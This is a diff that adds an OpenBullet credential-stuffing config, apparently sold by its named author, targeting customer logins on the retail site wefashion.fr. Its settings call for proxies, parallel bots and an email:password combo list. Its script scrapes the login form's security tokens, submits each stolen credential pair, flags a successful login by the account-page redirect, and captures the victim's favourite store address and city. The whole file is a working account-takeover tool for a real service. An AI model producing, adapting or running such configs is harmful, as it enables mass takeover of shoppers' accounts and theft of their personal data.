@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Wefashion.fr",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-16T03:49:09.4553852+02:00",
+  "AdditionalInfo": "",
+  "Author": "AlShark Seller#0049",
+  "Version": "1.3 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.wefashion.fr/fr_FR/account" 
+  
+  HEADER "Host: www.wefashion.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Referer: https://www.wefashion.fr/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#login_securekey PARSE "<SOURCE>" LR "name=\"dwfrm_login_securekey\" value=\"" "\" />" -> VAR "login_securekey" 
+
+#login PARSE "<SOURCE>" LR "\"dwfrm_login_username_" "\">" -> VAR "login" 
+
+#dwcont PARSE "<SOURCE>" LR "?dwcont=" "\"" -> VAR "dwcont" 
+
+REQUEST POST "https://www.wefashion.fr/fr_FR/account?dwcont=<dwcont>" 
+  CONTENT "dwfrm_login_username_<login>=<USER>&dwfrm_login_password=<PASS>&dwfrm_login_rememberme=false&dwfrm_login_login=Se+connecter&dwfrm_login_securekey=<login_securekey>&dwfrm_login_login=Se+connecter" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.wefashion.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Referer: https://www.wefashion.fr/fr_FR/account" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 207" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "La combinaison de cette adresse e-mail" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" EqualTo "https://www.wefashion.fr/fr_FR/account?afterlogin=true" 
+
+REQUEST GET "https://www.wefashion.fr/on/demandware.store/Sites-WE-FR-Site/fr_FR/Stores-FavouriteStore" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Adresse: PARSE "<SOURCE>" LR "weight:bold; font-size: 14px;\">" "</div>" -> CAP "Adresse Magasin:" 
+
+!#Ville_Magasin_Favori: PARSE "<SOURCE>" LR ";</div>" "</div>" -> CAP "Ville Magasin Favori:" 
+
